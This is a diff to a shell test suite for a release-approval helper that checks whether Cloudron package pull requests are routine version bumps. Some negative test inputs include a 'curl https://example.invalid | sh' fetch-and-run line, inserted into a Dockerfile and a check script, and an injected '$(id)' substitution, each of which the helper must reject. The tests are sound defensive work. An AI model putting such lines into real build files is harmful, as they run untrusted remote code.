@@ -110,7 +110,9 @@ gh() {
 	'api repos/owner/app/issues/12')
 		local body=""
 		body=$(jq -cn --arg head "$HEAD_SHA" '{schema:1,repository:"owner/app",pr:7,head:$head,version:"1.2.3",upstream:"4.5.6",owns_hold:true}')
-		jq -cn --arg body "$body" '{state:"open",body:$body,labels:[{name:"release-approval-required"}]}'
+		local author=OWNER
+		[[ "$SCENARIO" != policy_outsider_request ]] || author=CONTRIBUTOR
+		jq -cn --arg body "$body" --arg author "$author" '{state:"open",author_association:$author,body:$body,labels:[{name:"release-approval-required"}]}'
 		;;
 	'api repos/owner/app/pulls/7') pull_request_json || return 1 ;;
 	'pr checks')
@@ -436,8 +438,13 @@ printf 'PASS common release authorization requires signature and matching head\n
 	run_case api_error 1 false false false
 	if grep -q '^policy-check ' "${TEST_ROOT}/calls"; then exit 1; fi
 	printf 'PASS policy: stale or unverifiable signatures never fall back to the policy\n'
+	run_case policy_outsider_request 0 false false false
+	if grep -q '^policy-check ' "${TEST_ROOT}/calls"; then exit 1; fi
+	printf 'PASS policy: an outsider-authored request never reaches the policy\n'
 	run_case policy_resumed 0 false true true
-	printf 'PASS policy: a merged exact head resumes publication verification only\n'
+	grep -q 'authority: publication verification only; merged outside standing policy #50' "${TEST_ROOT}/calls"
+	if grep -q '^policy-check ' "${TEST_ROOT}/calls"; then exit 1; fi
+	printf 'PASS policy: a merged exact head resumes publication verification only and does not claim the policy\n'
 	run_case policy_changed 0 false true true
 	grep -q 'issue close 12 --repo owner/app --reason not planned' "${TEST_ROOT}/calls"
 	printf 'PASS policy: an unsigned request whose head moved is retired for a fresh request\n'
@@ -458,7 +465,9 @@ printf 'PASS common release authorization requires signature and matching head\n
 	if release_authorize owner/app 7 "$HEAD_SHA"; then exit 1; fi
 	export SCENARIO=stale
 	if release_authorize owner/app 7 "$HEAD_SHA"; then exit 1; fi
-	printf 'PASS policy: the merge-authority guard accepts only a policy-proven exact head\n'
+	export SCENARIO=policy_outsider_request
+	if release_authorize owner/app 7 "$HEAD_SHA"; then exit 1; fi
+	printf 'PASS policy: the merge-authority guard accepts only a policy-proven exact head from a trusted request\n'
 )
 
 # Exercise the real final transport-head guard, not just the merge stub.
@@ -775,32 +784,46 @@ b64() {
 	printf '%s' "$1" | base64 | tr -d '\n'
 	return 0
 }
-POLICY_JSON='{"schema":1,"kind":"cloudron-standing-upstream-release","repository":"owner/app","changelog_files":["CHANGELOG","CHANGELOG.md"],"pinned_files":["Dockerfile"],"check_files":["test/package-test.sh"]}'
+# The policy is the helper's real default, so its insertion pattern is tested
+# against realistic check-file lines.
+POLICY_JSON=$(
+	# shellcheck source=../cloudron-release-approval-helper.sh
+	source "${SOURCE_DIR}/cloudron-release-approval-helper.sh"
+	release_policy_metadata "$(release_policy_body owner/app 'Maintainer command: x')" owner/app
+)
 BASE_MANIFEST='{"id":"io.example.app","version":"0.1.43","upstreamVersion":"3.39.87","changelog":"file://CHANGELOG"}'
 HEAD_MANIFEST='{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}'
-BASE_DOCKERFILE=$'FROM base@sha256:abc\nARG AIDEVOPS_VERSION=3.39.87\nLABEL version="0.1.43"\n'
-HEAD_DOCKERFILE=$'FROM base@sha256:abc\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\n'
+BASE_DOCKERFILE=$'FROM base@sha256:abc\nARG NODE_VERSION=10.1.43\nARG AIDEVOPS_VERSION=3.39.87\nLABEL version="0.1.43"\n'
+HEAD_DOCKERFILE=$'FROM base@sha256:abc\nARG NODE_VERSION=10.1.43\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\n'
+CHECK_PREFIX=$'main() {\n\tjq -e \'.version == "'
+BASE_CHECK="${CHECK_PREFIX}"$'0.1.43" and .upstreamVersion == "3.39.87"\' m || return 1\n\tassert_contains CHANGELOG \'[0.1.43]\' || return 1\n\tassert_contains Dockerfile \'ARG AIDEVOPS_VERSION=3.39.87\' || return 1\n}\n'
+CHECK_INSERTED=$'\tassert_contains CHANGELOG \'* Update the bundled aidevops CLI to 3.39.114.\' || return 1\n\tassert_contains CHANGELOG.md "- Updated and pinned the bundled aidevops CLI to \\`3.39.114\\`." || return 1\n'
+HEAD_CHECK="${CHECK_PREFIX}"$'0.1.44" and .upstreamVersion == "3.39.114"\' m || return 1\n\tassert_contains CHANGELOG \'[0.1.44]\' || return 1\n'"${CHECK_INSERTED}"$'\tassert_contains Dockerfile \'ARG AIDEVOPS_VERSION=3.39.114\' || return 1\n}\n'
 routine_doc() {
 	local filter="${1:-.}"
 	jq -cn --argjson policy "$POLICY_JSON" --arg bm "$(b64 "$BASE_MANIFEST")" --arg hm "$(b64 "$HEAD_MANIFEST")" \
-		--arg bd "$(b64 "$BASE_DOCKERFILE")" --arg hd "$(b64 "$HEAD_DOCKERFILE")" '
+		--arg bd "$(b64 "$BASE_DOCKERFILE")" --arg hd "$(b64 "$HEAD_DOCKERFILE")" \
+		--arg bc "$(b64 "$BASE_CHECK")" --arg hc "$(b64 "$HEAD_CHECK")" '
 		{policy: $policy, finding_upstream: "3.39.114",
 		 files: [{filename: "CHANGELOG", status: "modified", additions: 3, deletions: 0},
 		         {filename: "CHANGELOG.md", status: "modified", additions: 6, deletions: 0},
 		         {filename: "CloudronManifest.json", status: "modified", additions: 2, deletions: 2},
 		         {filename: "Dockerfile", status: "modified", additions: 2, deletions: 2},
 		         {filename: "test/package-test.sh", status: "modified", additions: 6, deletions: 4}],
-		 contents: {"CloudronManifest.json": {base: $bm, head: $hm}, Dockerfile: {base: $bd, head: $hd}}}
+		 contents: {"CloudronManifest.json": {base: $bm, head: $hm}, Dockerfile: {base: $bd, head: $hd},
+		            "test/package-test.sh": {base: $bc, head: $hc}}}
 		| '"$filter"
 	return 0
 }
+# Rejections must name the expected reason so a removed guard cannot pass
+# silently through a different one.
 assert_routine() {
-	local expected="$1" label="$2" filter="${3:-.}" output="" rc=0
+	local expected="$1" label="$2" filter="${3:-.}" reason="${4:-}" output="" rc=0
 	output=$(routine_doc "$filter" | python3 "${SOURCE_DIR}/cloudron_routine_bump.py" --repository owner/app) || rc=$?
 	if [[ "$expected" == routine ]]; then
 		[[ "$rc" -eq 0 && "$output" == ROUTINE_BUMP ]] || { printf 'FAIL routine %s: %s\n' "$label" "$output"; return 1; }
 	else
-		[[ "$rc" -eq 1 && "$output" == NOT_ROUTINE:* ]] || { printf 'FAIL not-routine %s rc=%s: %s\n' "$label" "$rc" "$output"; return 1; }
+		[[ -n "$reason" && "$rc" -eq 1 && "$output" == NOT_ROUTINE:*"$reason"* ]] || { printf 'FAIL not-routine %s rc=%s: %s\n' "$label" "$rc" "$output"; return 1; }
 	fi
 	printf 'PASS predicate %s: %s\n' "$label" "$output"
 	return 0
@@ -813,28 +836,55 @@ dockerfile_head() {
 	printf '.contents.Dockerfile.head = "%s"' "$(b64 "$1")"
 	return 0
 }
+check_head() {
+	printf '.contents["test/package-test.sh"].head = "%s"' "$(b64 "$1")"
+	return 0
+}
+manifest_base() {
+	printf '.contents["CloudronManifest.json"].base = "%s"' "$(b64 "$1")"
+	return 0
+}
 assert_routine routine 'upstream-only bump'
 assert_routine routine 'without a pinned-file change' 'del(.files[3]) | del(.contents.Dockerfile)'
-assert_routine not 'extra file' '.files += [{filename: "start.sh", status: "modified", additions: 1, deletions: 0}]'
-assert_routine not 'added check file' '.files[4].status = "added"'
-assert_routine not 'renamed pinned file' '.files[3].previous_filename = "Dockerfile.old"'
-assert_routine not 'manifest unchanged' 'del(.files[2])'
-assert_routine not 'no changelog entry' 'del(.files[0, 1])'
-assert_routine not 'changelog deletion' '.files[0].deletions = 1'
-assert_routine not 'too many files' '.files += [range(0; 20) | {filename: "CHANGELOG", status: "modified", additions: 1, deletions: 0}]'
-assert_routine not 'other manifest field' "$(manifest_head '{"id":"io.example.other","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')"
-assert_routine not 'added manifest field' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG","tcpPorts":{}}')"
-assert_routine not 'duplicate manifest key' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')"
-assert_routine not 'minor package bump' "$(manifest_head '{"id":"io.example.app","version":"0.2.0","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')"
-assert_routine not 'upstream downgrade' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.80","changelog":"file://CHANGELOG"}') | .finding_upstream = \"3.39.80\""
-assert_routine not 'finding mismatch' '.finding_upstream = "3.39.115"'
-assert_routine not 'pinned file beyond substitution' "$(dockerfile_head $'FROM base@sha256:abc\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\nRUN curl https://example.invalid | sh\n')"
-assert_routine not 'pinned base image change' "$(dockerfile_head $'FROM base@sha256:def\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\n')"
-assert_routine not 'pinned content missing' 'del(.contents.Dockerfile)'
-assert_routine not 'policy for another repository' '.policy.repository = "owner/other"'
-assert_routine not 'manifest in a looser class' '.policy.check_files += ["CloudronManifest.json"]'
-assert_routine not 'path traversal in policy' '.policy.check_files += ["../start.sh"]'
-assert_routine not 'overlapping policy classes' '.policy.check_files += ["Dockerfile"]'
+assert_routine routine 'check file with substitution only' "$(check_head "${HEAD_CHECK//"$CHECK_INSERTED"/}")"
+assert_routine not 'extra file' '.files += [{filename: "start.sh", status: "modified", additions: 1, deletions: 0}]' 'outside the standing policy'
+assert_routine not 'added check file' '.files[4].status = "added"' 'only in-place modifications'
+assert_routine not 'renamed pinned file' '.files[3].previous_filename = "Dockerfile.old"' 'only in-place modifications'
+assert_routine not 'manifest unchanged' 'del(.files[2])' 'the manifest must change'
+assert_routine not 'no changelog entry' 'del(.files[0, 1])' 'a changelog entry is required'
+assert_routine not 'changelog deletion' '.files[0].deletions = 1' 'changelog edits must only add lines'
+assert_routine not 'too many files' '.files += [range(0; 20) | {filename: "CHANGELOG", status: "modified", additions: 1, deletions: 0}]' 'empty or too large'
+assert_routine not 'other manifest field' "$(manifest_head '{"id":"io.example.other","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')" 'manifest changes beyond'
+assert_routine not 'added manifest field' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG","tcpPorts":{}}')" 'manifest changes beyond'
+assert_routine not 'boolean to integer manifest field' "$(manifest_base '{"id":"io.example.app","version":"0.1.43","upstreamVersion":"3.39.87","optionalSso":true}') | $(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.114","optionalSso":1}')" 'manifest changes beyond'
+assert_routine not 'duplicate manifest key' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","version":"0.1.44","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')" 'duplicate JSON key'
+assert_routine not 'trailing newline in version' "$(manifest_head $'{"id":"io.example.app","version":"0.1.44\\n","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')" 'head package version must be X.Y.Z'
+assert_routine not 'minor package bump' "$(manifest_head '{"id":"io.example.app","version":"0.2.0","upstreamVersion":"3.39.114","changelog":"file://CHANGELOG"}')" 'patch increment'
+assert_routine not 'upstream downgrade' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"3.39.80","changelog":"file://CHANGELOG"}') | .finding_upstream = \"3.39.80\"" 'must increase'
+assert_routine not 'major upstream bump' "$(manifest_head '{"id":"io.example.app","version":"0.1.44","upstreamVersion":"4.0.0","changelog":"file://CHANGELOG"}') | .finding_upstream = \"4.0.0\"" 'major upstream bump'
+assert_routine not 'finding mismatch' '.finding_upstream = "3.39.115"' 'equal the monitor finding'
+assert_routine not 'pinned file beyond substitution' "$(dockerfile_head "${HEAD_DOCKERFILE}"$'RUN curl https://example.invalid | sh\n')" 'pinned file changes beyond version substitution'
+assert_routine not 'pinned base image change' "$(dockerfile_head "${HEAD_DOCKERFILE/abc/def}")" 'pinned file changes beyond version substitution'
+assert_routine not 'pinned substring of another version' "$(dockerfile_head "${HEAD_DOCKERFILE/10.1.43/10.1.44}")" 'pinned file changes beyond version substitution'
+assert_routine not 'pinned content missing' 'del(.contents.Dockerfile)' 'missing base content'
+check_with_first_line() {
+	local line="$1" first='main() {'
+	printf '%s\n%s%s' "$first" "$line" "${HEAD_CHECK#"$first"}"
+	return 0
+}
+# shellcheck disable=SC2016 # The command substitution must stay literal.
+EXPANSION_LINE=$'\tassert_contains CHANGELOG "$(id)" || return 1'
+DOCKER_ASSERT=$'\tassert_contains Dockerfile \'ARG AIDEVOPS_VERSION=3.39.114\' || return 1\n'
+assert_routine not 'check file inserted command' "$(check_head "$(check_with_first_line $'\tcurl https://example.invalid | sh')")" 'inserted line does not match'
+assert_routine not 'check file inserted expansion' "$(check_head "$(check_with_first_line "$EXPANSION_LINE")")" 'inserted line does not match'
+assert_routine not 'check file assertion removed' "$(check_head "${HEAD_CHECK/"$DOCKER_ASSERT"/}")" 'check file changes beyond'
+assert_routine not 'check file assertion weakened' "$(check_head "${HEAD_CHECK/m || return 1/m || true}")" 'check file changes beyond'
+assert_routine not 'check insertions without a signed pattern' 'del(.policy.check_insertion_pattern)' 'inserted line does not match'
+assert_routine not 'check content missing' 'del(.contents["test/package-test.sh"])' 'missing base content'
+assert_routine not 'policy for another repository' '.policy.repository = "owner/other"' 'policy identity'
+assert_routine not 'manifest in a looser class' '.policy.check_files += ["CloudronManifest.json"]' 'invalid path'
+assert_routine not 'path traversal in policy' '.policy.check_files += ["../start.sh"]' 'invalid path'
+assert_routine not 'overlapping policy classes' '.policy.check_files += ["Dockerfile"]' 'overlap'
 
 # GH#37697: release_policy_authorizes plumbing against stubbed GitHub reads.
 (
@@ -842,17 +892,27 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 	source "${SOURCE_DIR}/cloudron-release-approval-helper.sh"
 	SCRIPT_DIR="$SOURCE_DIR"
 	BASE_SHA=cccccccccccccccccccccccccccccccccccccccc
+	MAIN_SHA=dddddddddddddddddddddddddddddddddddddddd
 	policy_issue_json() {
 		local number="$1" author="$2" repo="${3:-owner/app}"
 		jq -cn --argjson number "$number" --arg author "$author" \
 			--arg body "$(release_policy_body "$repo" "Maintainer command: \`sudo aidevops approve issue ${number} ${repo}\`")" \
-			'{number: $number, html_url: ("https://example.invalid/issue/" + ($number | tostring)), author_association: $author, body: $body}'
+			'{number: $number, html_url: ("https://example.invalid/issue/" + ($number | tostring)), author_association: $author, body: $body,
+			  state: "open", closed_at: null, updated_at: "2026-11-11T00:00:00Z", labels: [{name: "release-standing-policy"}]}'
 		return 0
 	}
 	gh() {
-		local command="$1" target="${2:-}" path="" ref="" docker=""
+		local command="$1" target="${2:-}" path="" ref="" docker="" check=""
 		printf 'gh %s\n' "$*" >>"${TEST_ROOT}/calls"
 		case "$command $target" in
+		'api repos/owner/app/issues/50')
+			# The post-verification re-read; "swapped" serves a different body.
+			case "$POLICY_CASE" in
+			swapped) policy_issue_json 50 OWNER | jq -c '.body |= sub("Dockerfile"; "start.sh")' ;;
+			*) policy_issue_json 50 OWNER ;;
+			esac
+			;;
+		'api repos/owner/app/git/ref/heads/main') printf '%s\n' "$MAIN_SHA" ;;
 		'api repos/owner/app/issues?state=open&labels=release-standing-policy&per_page=100')
 			case "$POLICY_CASE" in
 			none | create) printf '[]\n' ;;
@@ -864,18 +924,25 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 			esac
 			;;
 		'api repos/owner/app/pulls/7')
-			jq -cn --arg head "$HEAD_SHA" '{state: "open", merged: false, draft: false, author_association: "OWNER",
-				head: {sha: $head, repo: {full_name: "owner/app"}}, base: {ref: "main", repo: {full_name: "owner/app"}}}'
+			jq -cn --arg head "$HEAD_SHA" --arg scenario "$POLICY_CASE" '{state: "open", closed_at: null, merged: false, draft: false, author_association: "OWNER",
+				head: {sha: $head, repo: {full_name: "owner/app"}}, base: {ref: "main", repo: {full_name: "owner/app"}},
+				auto_merge: null, labels: [{name: "release-approval-required"}, {name: "hold-for-review"}]}
+				| if $scenario == "auto_merge" then .auto_merge = {merge_method: "squash"}
+				  elif $scenario == "maintainer_brake" then .labels += [{name: "needs-maintainer-review"}]
+				  elif $scenario == "no_release_hold" then .labels = [{name: "hold-for-review"}]
+				  else . end'
 			;;
 		'pr view') jq -cn --arg head "$HEAD_SHA" '{closingIssuesReferences: [{number: 30}], headRefOid: $head}' ;;
 		'api repos/owner/app/issues/30')
-			printf '{"state":"open","author_association":"OWNER","body":"Finding\\n<!-- aidevops:cloudron-package-monitor upstream-v3.39.114 -->\\n"}\n'
+			jq -cn --arg scenario "$POLICY_CASE" '{state: (if $scenario == "finding_closed" then "closed" else "open" end), author_association: "OWNER",
+				body: "Finding\n<!-- aidevops:cloudron-package-monitor upstream-v3.39.114 -->\n"}'
 			;;
-		"api repos/owner/app/compare/main...${HEAD_SHA}")
+		"api repos/owner/app/compare/${MAIN_SHA}...${HEAD_SHA}")
 			jq -cn --arg base "$BASE_SHA" --arg scenario "$POLICY_CASE" '{merge_base_commit: {sha: $base},
 				files: ([{filename: "CHANGELOG", status: "modified", additions: 3, deletions: 0},
 				         {filename: "CloudronManifest.json", status: "modified", additions: 2, deletions: 2},
-				         {filename: "Dockerfile", status: "modified", additions: 2, deletions: 2}]
+				         {filename: "Dockerfile", status: "modified", additions: 2, deletions: 2},
+				         {filename: "test/package-test.sh", status: "modified", additions: 6, deletions: 4}]
 				        + if $scenario == "extra_file" then [{filename: "start.sh", status: "modified", additions: 1, deletions: 0}] else [] end)}'
 			;;
 		'api repos/owner/app/contents/'*)
@@ -883,12 +950,16 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 			ref="${path##*\?ref=}"
 			path="${path%%\?ref=*}"
 			docker="$HEAD_DOCKERFILE"
-			[[ "$POLICY_CASE" != docker_tamper ]] || docker=$'FROM base@sha256:def\nARG AIDEVOPS_VERSION=3.39.114\nLABEL version="0.1.44"\n'
+			[[ "$POLICY_CASE" != docker_tamper ]] || docker="${HEAD_DOCKERFILE/abc/def}"
+			check="$HEAD_CHECK"
+			[[ "$POLICY_CASE" != check_tamper ]] || check="${HEAD_CHECK/m || return 1/m || true}"
 			case "${path}@${ref}" in
 			"CloudronManifest.json@${BASE_SHA}") b64 "$BASE_MANIFEST" ;;
 			"CloudronManifest.json@${HEAD_SHA}") b64 "$HEAD_MANIFEST" ;;
 			"Dockerfile@${BASE_SHA}") b64 "$BASE_DOCKERFILE" ;;
 			"Dockerfile@${HEAD_SHA}") b64 "$docker" ;;
+			"test/package-test.sh@${BASE_SHA}") b64 "$BASE_CHECK" ;;
+			"test/package-test.sh@${HEAD_SHA}") b64 "$check" ;;
 			*) return 1 ;;
 			esac
 			printf '\n'
@@ -931,8 +1002,17 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 		return 0
 	}
 	assert_policy verified 0
+	# The compare base is the resolved main SHA, never the bare branch name.
+	grep -q "^gh api repos/owner/app/compare/${MAIN_SHA}\.\.\.${HEAD_SHA}\$" "${TEST_ROOT}/calls"
 	assert_policy docker_tamper 1
 	grep -q 'pinned file changes beyond version substitution' "${TEST_ROOT}/policy-err"
+	assert_policy check_tamper 1
+	grep -q 'check file changes beyond version substitution' "${TEST_ROOT}/policy-err"
+	assert_policy swapped 1
+	assert_policy finding_closed 1
+	assert_policy auto_merge 1
+	assert_policy maintainer_brake 1
+	assert_policy no_release_hold 1
 	assert_policy extra_file 1
 	assert_policy pending 1
 	assert_policy unsigned 1
@@ -984,14 +1064,17 @@ assert_routine not 'overlapping policy classes' '.policy.check_files += ["Docker
 	[[ "$(release_policy_request owner/app)" == "$expected_policy_output" ]]
 	grep -q '^issue-edit 50 ' "${TEST_ROOT}/calls"
 	printf 'PASS interrupted unsigned policy request is finalized\n'
-	export POLICY_CASE=stale
-	: >"${TEST_ROOT}/calls"
 	gh() {
 		printf 'gh %s\n' "$*" >>"${TEST_ROOT}/calls"
-		jq -cn --argjson a "$(policy_issue_json 50 OWNER)" '[$a | .body |= sub("Maintainer command:[^\n]*"; "Policy finalization pending.")]'
+		# A non-canonical body that still carries the maintainer command.
+		jq -cn --argjson a "$(policy_issue_json 50 OWNER)" '[$a | .body |= sub("Dockerfile"; "start.sh")]'
 		return 0
 	}
-	if release_policy_request owner/app 2>/dev/null; then exit 1; fi
-	if grep -q '^issue-edit ' "${TEST_ROOT}/calls"; then exit 1; fi
-	printf 'PASS a signed or stale policy body is never rewritten\n'
+	for POLICY_CASE in verified stale api_error; do
+		export POLICY_CASE
+		: >"${TEST_ROOT}/calls"
+		if release_policy_request owner/app 2>/dev/null; then exit 1; fi
+		if grep -q '^issue-edit ' "${TEST_ROOT}/calls"; then exit 1; fi
+	done
+	printf 'PASS a non-canonical signed, stale or unverifiable policy body is never rewritten or offered for signing\n'
 )
